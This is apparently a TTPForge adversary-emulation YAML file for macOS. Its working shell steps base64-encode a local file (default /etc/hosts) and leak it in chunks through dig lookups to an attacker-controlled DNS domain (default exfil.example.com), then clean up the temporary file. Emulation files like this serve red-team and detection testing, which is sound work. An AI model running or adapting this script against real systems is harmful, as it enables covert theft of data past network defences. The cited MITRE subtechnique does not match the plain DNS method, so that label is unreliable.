---
api_version: 2.0
uuid: c9d0e1f2-a3b4-4c5d-6e7f-8091a2b3c4d5
name: DNS Exfiltration
authors:
- TTPForge
description: |
  Exfiltrate data through DNS queries by encoding file contents as DNS subdomain
  labels and sending them as lookups to an attacker-controlled DNS server.
mitre:
  tactics:
  - TA0010 Exfiltration
  techniques:
  - T1048 Exfiltration Over Alternative Protocol
  subtechniques:
  - 'T1048.001 Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol'
requirements:
  platforms:
  - os: darwin
args:
- name: data_file
  description: File to exfiltrate via DNS
  type: string
  default: /etc/hosts
- name: dns_server
  description: Attacker-controlled DNS domain to query
  type: string
  default: exfil.example.com
- name: chunk_size
  description: Size of data chunks in characters per DNS label
  type: string
  default: '32'
steps:
- name: prepare_data_for_exfiltration
  description: Read and base64 encode the target file for DNS transport
  inline: |
    if [ -f '{{ .Args.data_file }}' ]; then
      echo "File size: $(du -h '{{ .Args.data_file }}' | cut -f1)"
      base64 < '{{ .Args.data_file }}' | tr -d '\n' > /tmp/dns_exfil_encoded.txt
      encoded_size=$(wc -c < /tmp/dns_exfil_encoded.txt)
      echo "Encoded size: ${encoded_size} bytes"
      chunks=$(( encoded_size / {{ .Args.chunk_size }} + 1 ))
      echo "Will send ${chunks} DNS queries"
    else
      echo "ERROR: File not found: {{ .Args.data_file }}"
      exit 1
    fi

- name: send_dns_exfiltration_queries
  description: Send encoded data chunks as DNS subdomain queries
  inline: |
    encoded=$(cat /tmp/dns_exfil_encoded.txt)
    total=${#encoded}
    chunk_size={{ .Args.chunk_size }}
    offset=0
    seq_num=0
    while [ $offset -lt $total ]; do
      chunk=$(echo "$encoded" | cut -c$((offset+1))-$((offset+chunk_size)))
      safe_chunk=$(echo "$chunk" | tr '+/=' '-_~')
      dig +short "${safe_chunk}.${seq_num}.{{ .Args.dns_server }}" A 2>/dev/null || true
      seq_num=$((seq_num + 1))
      offset=$((offset + chunk_size))
      [ $seq_num -le 5 ] && echo "Sent chunk ${seq_num}: ${safe_chunk:0:16}..."
      [ $seq_num -eq 6 ] && echo "... continuing ..."
    done
    echo "Exfiltration complete: sent ${seq_num} DNS queries"

- name: verify_dns_exfiltration
  description: Verify DNS queries were sent by checking resolver cache
  inline: |
    echo "DNS queries sent to {{ .Args.dns_server }} subdomains"
    echo "Total chunks sent: $(cat /tmp/dns_exfil_encoded.txt | wc -c | xargs echo | awk -v cs={{ .Args.chunk_size }} '{print int($1/cs)+1}')"
    dscacheutil -flushcache 2>/dev/null || true
  cleanup:
    inline: |
      rm -f /tmp/dns_exfil_encoded.txt

tests:
- name: dns_exfiltration_test
  dry_run: true
